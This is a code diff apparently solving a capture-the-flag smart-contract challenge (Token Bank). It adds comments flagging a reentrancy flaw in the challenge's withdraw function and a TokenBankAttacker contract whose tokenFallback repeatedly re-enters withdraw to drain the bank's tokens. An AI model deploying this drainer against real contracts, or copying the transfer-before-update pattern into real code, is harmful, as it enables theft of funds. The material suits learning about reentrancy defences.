@@ -57,6 +57,9 @@ contract SimpleERC223Token {
         // no-reentrancy vector
         if (isContract(to)) {
             // caller address, value
+
+            // tokenFallback could call again withdraw, transfering the total supply from the
+            // main contract to the attacker contract
             ITokenReceiver(to).tokenFallback(msg.sender, value, data);
         }
         return true;
@@ -134,7 +137,37 @@ contract TokenBankChallenge {
         // @audit the msg.sender in the token contract is this contract
         // balanceOf updated after transfer operation
         // reentrant?
+        // REENTRANCY WOULD BE AN EXPLOIT HERE, IF THE MSG.SENDER IS A CONTRACT
         require(token.transfer(msg.sender, amount));
         balanceOf[msg.sender] -= amount;
+    }
+}
+
+contract TokenBankAttacker {
+    TokenBankChallenge bankContract;
+    bool fundsRetired;
+
+    function setBankContract(address _bankAddr) public {
+        bankContract = TokenBankChallenge(_bankAddr);
+    }
+
+    function getFundsFromBank() private {
+        uint256 amount = 500000 * 10 ** 18;
+        bankContract.withdraw(amount);
+        fundsRetired = true;
+    }
+
+    function tokenFallback(address from, uint256 value, bytes) public {
+        if (
+            SimpleERC223Token(bankContract.token()).balanceOf(bankContract) == 0
+        ) {
+            return;
+        }
+
+        getFundsFromBank();
+    }
+
+    function attack() public {
+        getFundsFromBank();
     }
 }
